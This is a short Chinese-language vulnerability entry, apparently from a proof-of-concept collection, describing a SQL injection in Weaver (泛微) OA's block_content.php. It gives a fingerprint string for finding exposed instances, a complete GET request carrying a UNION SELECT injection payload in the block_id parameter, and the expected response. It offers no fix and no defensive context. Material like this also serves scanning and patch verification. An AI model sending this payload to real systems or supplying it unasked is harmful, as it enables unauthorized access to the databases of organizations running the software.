# 泛微OAblock_content.php存在SQL注入漏洞

泛微OA ｜ SQL注入 ｜ —
- **指纹**：`body = "/wui/common/css/w7OVFont_wev8.css"`
- **请求**：`GET /general/new_mytable/block_content.php?block_id=1%20UNION%20ALL%20SELECT%20CONCAT(0x71787a6a71,IFNULL(CAST(md5(123456)%20AS%20NCHAR),0x20),0x7171627671)--%20-`
- **响应特征**：200